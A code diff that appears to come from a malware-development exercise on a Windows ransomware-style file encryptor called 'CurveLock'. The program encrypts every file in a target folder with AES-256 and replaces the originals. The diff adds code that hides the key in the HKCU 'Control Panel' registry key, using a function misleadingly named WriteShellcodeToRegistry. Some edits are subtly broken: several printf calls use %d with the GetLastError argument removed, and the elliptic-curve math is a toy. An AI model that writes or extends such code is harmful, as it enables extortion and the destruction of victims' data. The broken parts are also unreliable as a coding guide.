@@ -16,6 +16,10 @@
 
 #define GET_FILE_EXTENSION_W(FilePath)       (wcsrchr(FilePath, L'.') ? wcsrchr(FilePath, L'.') : NULL)
 
+// Registry key to read / write
+#define REGISTRY            "Control Panel"
+#define REGSTRING           "CurveLock"
+
 typedef struct _ENCRYPTED_FILE_HEADER {
     BYTE    Signature[0x04];
     BYTE    IV[AES_BLOCK_SIZE];
@@ -62,18 +66,48 @@ Point pointAdd(Point P, Point Q) {
 }
 
 Point pointMultiply(Point P, int n) {
-    Point R = P;
-    for (int i = 1; i < n; i++) {
-        R = pointAdd(R, P);
+    Point R = { 0, 0 };
+    Point Q = P;
+    while (n > 0) {
+        if (n % 2 == 1) {
+            if (R.x == 0 && R.y == 0) {
+                R = Q;
+            }
+            else {
+                R = pointAdd(R, Q);
+            }
+        }
+        Q = pointAdd(Q, Q);
+        n /= 2;
     }
     return R;
 }
 
-void printHex(BYTE* data, size_t len) {
-    for (size_t i = 0; i < len; i++) {
-        printf("%02x", data[i]);
+BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {
+    BOOL        bSTATE = TRUE;
+    LSTATUS     STATUS = NULL;
+    HKEY        hKey = NULL;
+
+    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);
+
+    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
+    if (ERROR_SUCCESS != STATUS) {
+        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
+        bSTATE = FALSE; goto _EndOfFunction;
     }
-    printf("\n");
+
+    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
+    if (ERROR_SUCCESS != STATUS) {
+        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
+        bSTATE = FALSE; goto _EndOfFunction;
+    }
+
+    printf("[+] DONE ! \n");
+
+_EndOfFunction:
+    if (hKey)
+        RegCloseKey(hKey);
+    return bSTATE;
 }
 
 BOOL Aes256EncryptBuffer(BYTE* pbKey, BYTE* pbIV, BYTE* pbData, DWORD cbData, BYTE* pbEncryptedData, DWORD* pcbEncryptedData) {
@@ -246,6 +280,12 @@ BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
     Point Sa = pointMultiply(Pb, na);
     Point Sb = pointMultiply(Pa, nb);
 
+    // Debugging information
+    printf("Pa: (%d, %d)\n", Pa.x, Pa.y);
+    printf("Pb: (%d, %d)\n", Pb.x, Pb.y);
+    printf("Sa: (%d, %d)\n", Sa.x, Sa.y);
+    printf("Sb: (%d, %d)\n", Sb.x, Sb.y);
+
     // Ensure Sa and Sb are the same
     if (Sa.x != Sb.x || Sa.y != Sb.y) {
         printf("[!] ECDH key exchange failed\n");
@@ -271,9 +311,10 @@ BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
 
     BCryptCloseAlgorithmProvider(hAlg, 0);
 
-    // Print the generated AES key
-    printf("Generated AES Key: ");
-    printHex(pbKey, AES_KEY_SIZE);
+    // Save the generated AES key to the registry
+    if (!WriteShellcodeToRegistry(pbKey, AES_KEY_SIZE)) {
+        goto _END_OF_FUNC;
+    }
 
     DWORD cbEncryptedData = dwFileBufferSize + AES_BLOCK_SIZE;
     if (!Aes256EncryptBuffer(pbKey, pbIV, (BYTE*)uFileBufferAddr, dwFileBufferSize, (BYTE*)(uEncryptedFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER)), &cbEncryptedData))
@@ -290,12 +331,12 @@ BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
     }
 
     if (!FlushFileBuffers(hDestinationFile)) {
-        printf("[!] FlushFileBuffers Failed With Error: %d\n", GetLastError());
+        printf("[!] FlushFileBuffers Failed With Error: %d\n");
         goto _END_OF_FUNC;
     }
 
     if (!SetEndOfFile(hDestinationFile)) {
-        printf("[!] SetEndOfFile Failed With Error: %d\n", GetLastError());
+        printf("[!] SetEndOfFile Failed With Error: %d\n");
         goto _END_OF_FUNC;
     }
 
@@ -359,7 +400,7 @@ _END_OF_FUNC:
     return bResult;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+int main() {
     WCHAR DirectoryPath[MAX_PATH] = L"C:\\Users\\MALDEV01\\Desktop\\TestFolder";
     EncryptFilesInGivenDir(DirectoryPath);
     return 0;
